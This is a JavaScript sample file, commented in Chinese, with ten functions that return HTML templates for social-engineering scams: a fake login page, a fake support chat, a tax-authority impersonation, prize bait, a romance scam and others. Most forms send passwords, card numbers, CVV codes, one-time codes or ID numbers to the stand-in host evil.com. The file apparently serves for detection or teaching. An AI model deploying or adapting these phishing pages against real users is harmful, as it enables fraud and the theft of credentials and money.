// Social Engineering 漏洞示例文件

// 示例 1: 钓鱼攻击 - 伪造登录页面
export function socialEngineeringExample1() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Login - Please Sign In</title>
      <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 100px auto; padding: 20px; }
        .login-form { background: #f5f5f5; padding: 30px; border-radius: 5px; }
        input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
      </style>
    </head>
    <body>
      <div class="login-form">
        <h2>Sign In</h2>
        <form action="https://evil.com/steal" method="POST">
          <input type="text" name="username" placeholder="Username" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit">Sign In</button>
        </form>
      </div>
    </body>
    </html>
  `;
}

// 示例 2: 紧急通知社会工程学攻击
export function socialEngineeringExample2() {
  return `
    <div class="alert alert-danger">
      <h3>⚠️ 紧急通知：您的账户已被锁定</h3>
      <p>我们检测到您的账户存在异常活动，为了保护您的安全，我们已暂时锁定您的账户。</p>
      <p>请立即点击下方链接验证您的身份，否则您的账户将在24小时内被永久删除。</p>
      <a href="https://evil.com/phishing?redirect=account-locked">立即验证身份</a>
    </div>
  `;
}

// 示例 3: 假冒客服社会工程学攻击
export function socialEngineeringExample3() {
  return `
    <div class="support-chat">
      <div class="message support">
        <strong>客服专员：</strong>
        您好，我是您的专属客服专员。我们注意到您最近有一笔异常交易，为了您的资金安全，请您提供以下信息进行核实：
        <ul>
          <li>银行卡号</li>
          <li>CVV安全码</li>
          <li>手机验证码</li>
        </ul>
      </div>
      <form action="https://evil.com/collect-info" method="POST">
        <input type="text" name="cardNumber" placeholder="银行卡号">
        <input type="text" name="cvv" placeholder="CVV安全码">
        <input type="text" name="otp" placeholder="手机验证码">
        <button type="submit">提交验证</button>
      </form>
    </div>
  `;
}

// 示例 4: 权威机构冒充社会工程学攻击
export function socialEngineeringExample4() {
  return `
    <div class="official-notice">
      <div class="header">
        <img src="fake-logo.png" alt="官方标志">
        <h2>国家税务总局</h2>
      </div>
      <div class="content">
        <h3>税务稽查通知</h3>
        <p>尊敬的纳税人：</p>
        <p>经系统检测，您存在以下税务问题：</p>
        <ul>
          <li>未申报收入：¥50,000</li>
          <li>欠缴税款：¥12,500</li>
          <li>滞纳金：¥3,750</li>
        </ul>
        <p>请在24小时内缴纳欠款，否则将采取强制执行措施。</p>
        <a href="https://evil.com/tax-scam" class="urgent-btn">立即缴纳</a>
      </div>
    </div>
  `;
}

// 示例 5: 诱饵攻击社会工程学
export function socialEngineeringExample5() {
  return `
    <div class="free-gift">
      <h2>🎁 恭喜您获得免费iPhone 15 Pro Max！</h2>
      <p>您已被随机选中获得我们的年度大奖！</p>
      <p>只需支付¥99运费即可领取价值¥8999的iPhone 15 Pro Max！</p>
      <p>名额有限，仅剩3台！</p>
      <form action="https://evil.com/scam" method="POST">
        <input type="text" name="name" placeholder="姓名" required>
        <input type="text" name="phone" placeholder="手机号" required>
        <input type="text" name="address" placeholder="收货地址" required>
        <input type="text" name="card" placeholder="银行卡号" required>
        <button type="submit">立即领取</button>
      </form>
    </div>
  `;
}

// 示例 6: 社交媒体冒充攻击
export function socialEngineeringExample6() {
  return `
    <div class="social-scam">
      <div class="profile">
        <img src="fake-avatar.jpg" alt="头像">
        <h3>您的朋友：李明</h3>
        <p>已认证用户 ✓</p>
      </div>
      <div class="message">
        <p>嘿！我在国外旅游时钱包被偷了，现在急需用钱。你能先借我5000元吗？我回国后马上还你！</p>
        <p>这是我的收款码：</p>
        <img src="fake-qr-code.jpg" alt="收款码">
        <p>扫码转账即可，谢谢兄弟！</p>
      </div>
    </div>
  `;
}

// 示例 7: 技术支持诈骗
export function socialEngineeringExample7() {
  return `
    <div class="tech-support">
      <div class="warning-banner">
        ⚠️ 警告：您的计算机已感染病毒！
      </div>
      <div class="content">
        <h2>系统安全警报</h2>
        <p>检测到您的计算机已感染严重恶意软件：</p>
        <ul>
          <li>Trojan.Generic.12345</li>
          <li>Ransomware.LockScreen</li>
          <li>Spyware.KeyLogger</li>
        </ul>
        <p>立即致电我们的技术支持热线：400-XXX-XXXX</p>
        <p>我们的专家将帮助您清除病毒并保护您的数据安全。</p>
        <p>警告：请勿关闭此页面，否则您的数据将被永久删除！</p>
      </div>
    </div>
  `;
}

// 示例 8: 情感操纵社会工程学
export function socialEngineeringExample8() {
  return `
    <div class="romance-scam">
      <div class="profile">
        <img src="attractive-photo.jpg" alt="照片">
        <h3>Sarah, 28岁</h3>
        <p>📍 纽约 | 💼 企业高管</p>
      </div>
      <div class="message">
        <p>亲爱的，我真的很喜欢你。我们聊了这么久，我觉得我们之间有特殊的连接。</p>
        <p>我现在遇到了一些困难，我的公司资金周转有问题，需要50万应急。</p>
        <p>如果你能帮我，我一定会加倍还你，而且我们可以见面了！</p>
        <p>这是我的银行账户信息，请相信我...</p>
        <form action="https://evil.com/romance-scam" method="POST">
          <input type="text" name="amount" placeholder="转账金额">
          <button type="submit">转账帮助</button>
        </form>
      </div>
    </div>
  `;
}

// 示例 9: 一致性原则社会工程学攻击
export function socialEngineeringExample9() {
  return `
    <div class="consistency-scam">
      <h2>环保责任调查问卷</h2>
      <p>感谢您对环保事业的关注！</p>
      <p>您已完成了90%的调查问卷，只需最后几个问题即可获得环保证书！</p>
      <form action="https://evil.com/collect-data" method="POST">
        <p>91. 您是否愿意为环保事业捐款？</p>
        <label><input type="radio" name="donate" value="yes" required> 是的，我愿意</label><br>
        <label><input type="radio" name="donate" value="no"> 不愿意</label>
        
        <p>为了发放环保证书，请提供以下信息：</p>
        <input type="text" name="name" placeholder="姓名" required>
        <input type="email" name="email" placeholder="邮箱" required>
        <input type="tel" name="phone" placeholder="手机号" required>
        <input type="text" name="idcard" placeholder="身份证号" required>
        <button type="submit">完成问卷</button>
      </form>
    </div>
  `;
}

// 示例 10: 稀缺性原则社会工程学攻击
export function socialEngineeringExample10() {
  return `
    <div class="scarcity-scam">
      <div class="countdown">
        <h2>⏰ 限时优惠！</h2>
        <p>剩余时间：<span id="timer">09:59:59</span></p>
      </div>
      <div class="offer">
        <h3>原价¥9999，现价仅需¥999！</h3>
        <p>仅剩 <span style="color: red;">3</span> 件！</p>
        <p>已有 <span style="color: green;">2,847</span> 人正在浏览此商品</p>
        <p><span style="color: orange;">156</span> 人刚刚下单！</p>
      </div>
      <form action="https://evil.com/scam" method="POST">
        <input type="text" name="name" placeholder="姓名" required>
        <input type="text" name="phone" placeholder="手机号" required>
        <input type="text" name="address" placeholder="地址" required>
        <input type="text" name="card" placeholder="银行卡号" required>
        <button type="submit">立即抢购</button>
      </form>
    </div>
  `;
}
